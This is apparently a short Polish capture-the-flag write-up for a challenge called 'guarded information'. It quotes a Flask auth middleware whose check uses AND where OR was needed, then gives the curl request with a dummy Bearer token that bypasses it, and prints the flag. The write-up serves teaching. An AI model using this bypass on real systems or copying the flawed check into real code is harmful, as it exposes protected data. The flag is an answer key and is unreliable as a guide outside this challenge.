# guarded information
![](853f10b0b51c1b5771bcb4f9ceff18b6)

Szybka analiza kodu jasno wskazuje miejsce flagi.
```
@app.route('/system-info')
@authenticate_middleware
def system_info():
    flag = os.environ.get("FLAG")
```
Nastąpiła analiza funkcji `authenticate_middleware` w poszukiwaniu błędów.
Błąd został znaleziony w tym fragmencie:
```
 if auth_method != "Bearer" and auth_token != token:
            return '', 403
```
Błąd 403 powinnien być zwracany jeżeli przynajmniej jedno z tych wyrażeń jest prawidziwe (powinno być OR zamiast AND).

Oznacza to, że dopóki header `Authorization` zaczyna się od frazy "Bearer ", to takie zapytanie przejdzie.

Po wykonaniu komendy `curl 'http://challenges.wsi.edu.pl:5002/system-info' -H 'Authorization: Bearer a'` pojawia się dane wraz z flagą.

Flaga: `WSIZ{ayyyyyy_should_it_be_or???}`